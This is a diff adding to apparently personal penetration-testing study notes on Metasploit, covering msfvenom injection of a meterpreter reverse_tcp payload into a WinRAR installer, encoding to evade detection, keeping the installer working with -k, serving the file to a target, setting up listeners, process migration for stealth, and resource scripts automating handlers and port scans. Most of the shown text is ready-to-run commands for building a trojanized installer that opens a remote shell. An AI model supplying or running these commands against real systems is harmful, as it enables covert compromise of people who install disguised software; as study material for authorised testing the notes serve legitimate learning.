@@ -539,4 +539,91 @@ Shellcode
 
 
 ### Injecting Payloads into Windows Portable Executables 
+    (we are using winrar as PE)
+
+
+1) Start up msfvenom 
+    Download winrar setup file 
+2) Generate 32 bit meterpreter payload and inject it in Winrar setup file 
+	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -x ~/Downloads/wrar602.exe > ~/Desktop/Windows_Payload/winrar.exe `
+	- transfer file to target 
+	- host a webserver on port 80: `sudo phython SimpleHTTPServer 80 `
+	- set up listener in msfconsole in new window: `use multi/handler ` set payload, lhost and lport
+
+
+How to maintain the functionality of the portable executable you are injecting your payload into:
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali LPORT=1234 -e x86/shikata_ga_nai -i 10 -f exe -k -x ~/Downloads/wrar602-new.exe > ~/Desktop/Windows_Payload/winrar-new.exe `
+	- The `-k` option will keep the original functionality of the file, if you do not add the -`k` option then nothing will happen when you click on the file (except the payload executing in memory)
+	- you need a lot of testing to get this right because it is not easy to add payload to legitimate executable 
+	- `-x` is used to specify a template executable file (== legit executable file e.g. winrar_setup_file_exe ) into which your payload will be injected, and `-k` is used to ensure that the original functionality of the template executable is preserved while incorporating your payloa
+
+
+3) post exploitation module (in the meterpreter session)
+	- migrating the Meterpreter session to a different process: ` run post/windows/manage/migrate  `
+
+used to initiate a process migration from the current compromised Windows machine to another process. Process migration is a technique often employed by attackers to move the Meterpreter session from one process to another, usually to avoid detection or maintain persistence on the compromised system.
+
+
+
+
+### Automating Metasploit With Resource Scripts 
+
+- metasploit resource scripts allow you to automate repetitive tasks and commands 
+- operate like batch scripts, you can specify a set of msfconsole commands that you want to execute sequentially 
+- you can load the scripts with msfconsole and automate the execution of the commands you specified in the resource script 
+- handy for setting up multi/handlers, loading and executing payloads 
+  
+  Msfconsole command (*resource*) can be used to load a resource script --> `resource ~/Desktop/handler.rc `
+
+Prepackaged resource script in kali:
+-` ls -al /usr/share/metasploit-framework/scripts/resource/ `
+- open a script: `vim /usr/share/metasploit-framework/scripts/resource/auto_brute.rc`
+
+1) automate process of setting up a multi/handler 
+	- `vim handler.rc` 
+		- specify the commands in here: 
+			- ` use multi/handler 
+			- `set PAYLOAD windows/meterpreter/reverse_tcp`
+			- `set LHOST kali_ip `
+			- `set LPORT 1234 `
+			- `run` `
+		- `wq` to get uit of vim 
+2) run the resource script: 
+	- `msfconsole -r handler.rc `
+
+voorbeeld:
+1) automate portscan 
+	- `vim portscan.rc `
+		- `use aux/scanner/portscan/tcp`
+		- `set RHOST targetip`
+		- `run` 
+2) execute the resource script 
+	- `msfconsole -r portscan.rc` 
+
+voorbeeld:
+1) automate check db_status
+	- `vim db_status.rc`
+		- `db_status `
+		- `workspace`
+		- `workspace -a testworkspace `
+2) run rc script 
+	- `msfconsole -r db_status.rc `
+
+
+1) Load resource scripts in directly from within msfconsole
+	- in msfconsole window: `resource ~/Desktop/Windows_Payloads/handler.rc `
+
+
+1) create resource script within msfconsole - save commands 
+   ![[Pasted image 20230824180205.png]]
+	- in msfconsole: 
+		- `makerc ~/Desktop/portscan.rc `
+- `cat portscan.rc` (you should see your commands )
+
+
+
+
+
+
+
 
